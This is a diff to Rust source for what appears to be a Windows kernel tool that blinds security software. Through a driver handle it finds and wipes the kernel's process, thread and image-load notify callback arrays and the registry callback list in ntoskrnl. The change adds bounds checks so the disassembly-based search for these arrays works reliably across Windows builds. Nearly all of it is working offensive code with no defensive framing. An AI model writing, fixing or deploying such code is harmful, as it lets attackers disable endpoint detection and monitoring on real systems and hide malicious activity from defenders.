@@ -110,7 +110,11 @@ fn owner_name(mods: &[KernelModule], va: u64) -> String {
 
 // ─── Setter disassembly helpers ─────────────────────────────────────────────
 
-fn collect_lea_rip(buf: &[u8], base_rva: u64) -> Vec<u64> {
+/// Emit every rip-relative-lea target inside `buf`, expressed as an RVA
+/// relative to the image base. `base_rva` is `buf`'s RVA inside the image;
+/// `img_size` is the image's `SizeOfImage`. Targets outside `[0, img_size)`
+/// are dropped so a bogus disp can't overflow later arithmetic.
+fn collect_lea_rip(buf: &[u8], base_rva: u64, img_size: u64) -> Vec<u64> {
     let mut out = Vec::new();
     let mut i = 0usize;
     while i + 7 <= buf.len() {
@@ -120,8 +124,11 @@ fn collect_lea_rip(buf: &[u8], base_rva: u64) -> Vec<u64> {
             let modrm = buf[i + 2];
             if modrm & 0xC7 == 0x05 {
                 let disp = i32::from_le_bytes(buf[i+3..i+7].try_into().unwrap());
-                let next_rip = base_rva + (i as u64) + 7;
-                out.push((next_rip as i64 + disp as i64) as u64);
+                let next_rip = base_rva.wrapping_add(i as u64).wrapping_add(7);
+                let tgt = (next_rip as i64).wrapping_add(disp as i64);
+                if tgt >= 0 && (tgt as u64) < img_size {
+                    out.push(tgt as u64);
+                }
                 i += 7;
                 continue;
             }
@@ -135,10 +142,16 @@ fn collect_lea_rip(buf: &[u8], base_rva: u64) -> Vec<u64> {
 /// AND the bodies of transfers it makes (E8 CALL or E9 JMP), up to a small
 /// hop budget. Handles the layered wrappers modern nt uses for the notify
 /// setters (setter → PspSet* → Psp*Internal) where the array `lea` only
-/// appears in the innermost frame.
-fn setter_lea_targets(nt_disk: usize, setter: &str, nt_kbase: u64) -> Vec<u64> {
+/// appears in the innermost frame. All arithmetic is bounds-checked against
+/// `img_size` so tail-jumps to imports (whose disp resolves outside `.text`)
+/// can't wrap into an out-of-image slice deref.
+fn setter_lea_targets(
+    nt_disk: usize, nt_disk_size: usize, setter: &str, nt_kbase: u64,
+) -> Vec<u64> {
+    let img_size = nt_disk_size as u64;
     let start_rva = match export_rva(nt_disk, setter) {
-        Some(v) => v, None => return vec![],
+        Some(v) if v < img_size => v,
+        _ => return vec![],
     };
     let mut targets: Vec<u64> = Vec::new();
     let mut visited: Vec<u64> = Vec::new();
@@ -150,25 +163,36 @@ fn setter_lea_targets(nt_disk: usize, setter: &str, nt_kbase: u64) -> Vec<u64> {
         for rva in frontier.drain(..) {
             if visited.contains(&rva) { continue; }
             visited.push(rva);
+            if rva >= img_size { continue; }
+            let remain = img_size - rva;
+            let win = remain.min(0x300) as usize;
+            if win < 5 { continue; }
             let buf = unsafe {
-                std::slice::from_raw_parts((nt_disk + rva as usize) as *const u8, 0x300)
+                std::slice::from_raw_parts((nt_disk + rva as usize) as *const u8, win)
             };
-            for t in collect_lea_rip(buf, rva) {
-                targets.push(nt_kbase + t);
+            for t in collect_lea_rip(buf, rva, img_size) {
+                // Sanity: rebase into a kernel VA and confirm it doesn't
+                // overflow the u64 space (it never will for a legitimate
+                // ntoskrnl-sized image, but the guard is cheap).
+                if let Some(kva) = nt_kbase.checked_add(t) {
+                    targets.push(kva);
+                }
             }
             // Follow only transfers that fall inside the setter's early
             // prologue (< 0x40 bytes) — that's where the tail-jump / thin
             // wrapper call to the internal helper lives. Deeper transfers
             // are conditional branches inside the body and following them
             // explodes the search space.
-            let prologue_end = 0x40.min(buf.len());
+            let prologue_end = 0x40.min(win);
             let mut i = 0usize;
             while i + 5 <= prologue_end {
                 if buf[i] == 0xE8 || buf[i] == 0xE9 {
                     let disp = i32::from_le_bytes(buf[i+1..i+5].try_into().unwrap());
-                    let next_rip = rva + (i as u64) + 5;
-                    let tgt = (next_rip as i64 + disp as i64) as u64;
-                    next.push(tgt);
+                    let next_rip = rva.wrapping_add(i as u64).wrapping_add(5);
+                    let tgt = (next_rip as i64).wrapping_add(disp as i64);
+                    if tgt >= 0 && (tgt as u64) < img_size {
+                        next.push(tgt as u64);
+                    }
                     i += 5;
                     continue;
                 }
@@ -230,14 +254,15 @@ fn wipe_ps_array(
 /// non-Ex — Win10/11 uses different layerings depending on the build), then
 /// pick the first candidate that validates as an `_EX_FAST_REF` array.
 fn resolve_ps_array(
-    drv: &Astra, cr3: u64, nt_disk: usize, nt_kbase: u64, setters: &[&str],
+    drv: &Astra, cr3: u64, nt_disk: usize, nt_disk_size: usize,
+    nt_kbase: u64, setters: &[&str],
 ) -> Result<(String, u64), String> {
     let mut all: Vec<u64> = Vec::new();
     let mut tried: Vec<&str> = Vec::new();
     for s in setters {
         if export_rva(nt_disk, s).is_none() { continue; }
         tried.push(*s);
-        all.extend(setter_lea_targets(nt_disk, s, nt_kbase));
+        all.extend(setter_lea_targets(nt_disk, nt_disk_size, s, nt_kbase));
     }
     all.sort_unstable();
     all.dedup();
@@ -255,7 +280,7 @@ fn resolve_ps_array(
 pub fn disable_ps_notify(
     drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
 ) -> Result<usize, String> {
-    let (nt_disk, _) = load_image("ntoskrnl.exe")?;
+    let (nt_disk, nt_disk_size) = load_image("ntoskrnl.exe")?;
     let mut total = 0usize;
     // Try Ex first when it exists — on 24H2 the non-Ex thread/image setters
     // are 5-byte tail-JMPs into the Ex form, so hitting Ex directly halves
@@ -269,8 +294,9 @@ pub fn disable_ps_notify(
            "PsSetLoadImageNotifyRoutine"],      "PspImg "),
     ];
     for (setters, label) in groups {
-        let (used, arr) = resolve_ps_array(drv, cr3, nt_disk, nt_kbase, setters)
-            .map_err(|e| format!("{}: {e}", setters[0]))?;
+        let (used, arr) = resolve_ps_array(
+            drv, cr3, nt_disk, nt_disk_size, nt_kbase, setters,
+        ).map_err(|e| format!("{}: {e}", setters[0]))?;
         println!("[+] {} → array VA 0x{:X}  (via {})", label.trim(), arr, used);
         total += wipe_ps_array(drv, cr3, arr, mods, label)?;
     }
@@ -364,10 +390,10 @@ pub fn disable_ob_callbacks(
 /// Enumerate all rip-relative lea targets in CmRegisterCallback[Ex] and pick
 /// the one that dereferences as a self-consistent LIST_ENTRY head.
 fn resolve_cmp_callback_head(
-    drv: &Astra, cr3: u64, nt_disk: usize, nt_kbase: u64,
+    drv: &Astra, cr3: u64, nt_disk: usize, nt_disk_size: usize, nt_kbase: u64,
 ) -> Result<u64, String> {
     for setter in ["CmRegisterCallbackEx", "CmRegisterCallback"] {
-        let cands = setter_lea_targets(nt_disk, setter, nt_kbase);
+        let cands = setter_lea_targets(nt_disk, nt_disk_size, setter, nt_kbase);
         for va in cands {
             if !is_kptr(va) { continue; }
             let flink = vread_u64(drv, cr3, va).unwrap_or(0);
@@ -423,8 +449,8 @@ fn wipe_cm_list(
 pub fn disable_cm_callbacks(
     drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
 ) -> Result<usize, String> {
-    let (nt_disk, _) = load_image("ntoskrnl.exe")?;
-    let head_va = resolve_cmp_callback_head(drv, cr3, nt_disk, nt_kbase)?;
+    let (nt_disk, nt_disk_size) = load_image("ntoskrnl.exe")?;
+    let head_va = resolve_cmp_callback_head(drv, cr3, nt_disk, nt_disk_size, nt_kbase)?;
     println!("[+] CmpCallbackListHead @ 0x{:X}", head_va);
     wipe_cm_list(drv, cr3, head_va, mods)
 }
